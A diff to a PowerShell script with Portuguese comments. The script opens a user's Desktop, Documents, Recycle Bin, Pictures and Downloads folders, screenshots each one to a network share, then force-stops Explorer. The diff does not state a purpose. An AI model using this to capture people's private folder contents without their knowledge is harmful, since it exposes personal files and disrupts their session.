@@ -40,19 +40,31 @@ function Capture-Screenshot {
     }
 }
 
-# Abrir as janelas
+
+Start-Process "explorer.exe" "$env:USERPROFILE\Desktop"
+Start-Sleep -Seconds 4
+Capture-Screenshot "Desktop" "$diretorioRede\Desktop.png"
+
 Start-Process "explorer.exe" "$env:USERPROFILE\Documents"
-Start-Process "explorer.exe" "shell:RecycleBinFolder"
-Start-Process "explorer.exe" "$env:USERPROFILE\Pictures"
-Start-Process "explorer.exe" "$env:USERPROFILE\Downloads"
-
-# Aguardar um momento para as janelas abrirem completamente
-Start-Sleep -Seconds 5
-
-# Tirar prints das janelas e salvar na pasta na rede
+Start-Sleep -Seconds 4
 Capture-Screenshot "Documents" "$diretorioRede\Documents.png"
+
+
+Start-Process "explorer.exe" "shell:RecycleBinFolder"
+Start-Sleep -Seconds 4
+Capture-Screenshot "Recycle Bin" "$diretorioRede\RecycleBin.png"
+
+
+
+Start-Process "explorer.exe" "$env:USERPROFILE\Pictures"
+Start-Sleep -Seconds 4
 Capture-Screenshot "Pictures" "$diretorioRede\Pictures.png"
+
+
+Start-Process "explorer.exe" "$env:USERPROFILE\Downloads"
+Start-Sleep -Seconds 4
 Capture-Screenshot "Downloads" "$diretorioRede\Downloads.png"
+
 
 # Fechar as janelas
 Stop-Process -Name "explorer" -ErrorAction SilentlyContinue
